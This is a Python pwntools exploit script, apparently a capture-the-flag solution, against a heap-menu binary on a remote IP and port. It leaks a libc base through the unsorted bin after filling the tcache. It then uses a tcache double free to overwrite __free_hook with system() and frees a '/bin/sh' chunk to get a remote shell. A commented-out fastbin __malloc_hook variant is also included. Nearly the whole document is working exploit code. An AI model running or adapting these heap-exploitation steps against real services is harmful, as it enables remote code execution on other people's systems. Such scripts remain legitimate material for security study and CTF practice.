from pwn import *
# context.log_level='debug'
context.terminal=['tmux','sp','-h']

# p = process("./pwn")
# p = process(["/glibc/2.27/amd64/lib/ld-2.27.so", "./pwn"], env={"LD_PRELOAD":"/glibc/2.27/amd64/lib/libc-2.27.so"})
p = remote("39.96.88.40",7020)
# libc = ELF("/glibc/2.27/amd64/lib/libc-2.27.so")
libc = ELF("./libc.so.6")
elf = ELF("./pwn")


def add(id,size,content='a'):
    p.sendlineafter(">> ",'1')
    p.sendlineafter(":\n",str(id))
    p.sendlineafter(":\n",str(size))
    p.sendafter(":\n",content)
def show(id):
    p.sendlineafter(">> ",'4')
    p.sendlineafter(":\n",str(id))
def delete(id):
    p.sendlineafter(">> ",'3')
    p.sendlineafter(":\n",str(id))
def edit(id,content):
    p.sendlineafter(">> ",'2')
    p.sendlineafter(":\n",str(id))
    p.sendafter(":\n",content)



# add(2,0x100)
# add(0,0x68)
# add(1,0x68)

# delete(2)
# show(2)
# leak_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
# libc_base = leak_addr - 0x3c4b78
# log.info("libc_base:"+hex(libc_base))
# malloc_hook = libc_base + libc.sym['__malloc_hook']
# log.info("malloc_hook:"+hex(malloc_hook))
# system_addr = libc_base + libc.sym['system']
# free_hook = libc_base + libc.sym['__free_hook']
# log.info("free_hook:"+hex(free_hook))

# delete(0)
# delete(1)
# delete(0)
# add(3,0x68,p64(malloc_hook-0x23))
# add(4,0x68)
# add(5,0x68)
# add(6,0x68,'a'*0x13+p64(system_addr))

add(0,0x200)
add(1,0x68)
for _ in range(7):
    delete(0)
delete(0)
show(0)

leak_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-96
log.info("main_arean:"+hex(leak_addr))
libc_base = leak_addr - 0x3ebc40#0x3aeca0+96
log.info("libc_base:"+hex(libc_base))
system_addr = libc_base + libc.sym['system']
log.info("system_addr:"+hex(system_addr))
free_hook = libc_base + libc.sym['__free_hook']
log.info("free_hook:"+hex(free_hook))
binsh_str = libc_base + libc.search('/bin/sh').next()

delete(1)
delete(1)
add(2,0x68,p64(free_hook))
add(3,0x68,"/bin/sh\x00")
add(4,0x68,p64(system_addr))


# gdb.attach(p,'b *$rebase(0xD66)')
delete(3)

p.interactive()